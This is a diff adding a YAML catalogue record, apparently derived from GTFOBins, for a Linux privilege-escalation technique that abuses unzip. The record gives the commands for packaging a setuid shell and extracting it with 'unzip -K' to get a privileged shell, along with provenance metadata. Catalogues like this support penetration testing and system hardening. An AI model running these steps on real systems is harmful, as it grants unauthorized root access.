@@ -1,0 +1,85 @@
+id: gtfobins/unzip/privilege-escalation/suid
+type: binary
+platform: linux
+name: unzip
+phases:
+- privilege-escalation
+capabilities:
+- privilege-escalation
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: 'unzip -K shell.zip
+
+    ./sh -p'
+references:
+- https://gtfobins.github.io/gtfobins/unzip/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        unzip:
+          comment: 'Certain `unzip` versions allows to preserve the SUID bit. For example, prepare an
+            archive beforehand with the following commands as root:
+
+
+            ```
+
+            cp /bin/sh .
+
+            chmod +s sh
+
+            zip shell.zip sh
+
+            ```'
+          functions:
+            privilege-escalation:
+            - code: 'unzip -K shell.zip
+
+                ./sh -p'
+              contexts:
+                sudo: null
+                suid: null
+    upstream_url: https://gtfobins.github.io/gtfobins/unzip/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: privilege-escalation
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: privilege-escalation
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: suid
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:092610f7ed49e854151267130fa276df22ff269aa568f5d480d8d8f44a95d6b8
